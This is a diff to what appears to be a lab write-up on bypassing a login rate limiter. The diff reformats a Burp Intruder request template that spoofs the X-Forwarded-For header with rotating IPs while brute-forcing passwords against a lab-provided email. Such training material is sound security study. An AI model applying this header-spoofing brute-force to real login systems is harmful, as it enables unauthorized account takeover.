@@ -23,10 +23,10 @@ The target login system implemented a naive rate-limiting mechanism intended to 
 
 ## Exploitation Payload
 The core exploit was the manipulation of the HTTP request header. The request structure sent by Burp Intruder was:
-	`POST /login HTTP/1.1`
-	`....`
-	`X-Forwarded-For: <IP>`
-	`{"email":"<given-email-by-lab>","password":"iauwdapjdoaipjuga"}`
+	`POST /login HTTP/1.1
+	....
+	X-Forwarded-For: <IPs-go-here>
+	{"email":"<given-email-by-lab>","password":"<password-list-goes-here>"}`
 
 ## Payload Positions:
 - §IP_ADDRESS§: A set of spoofed IP addresses `(e.g., 192.168.1.1, 192.168.1.2, 10.0.0.1)`.
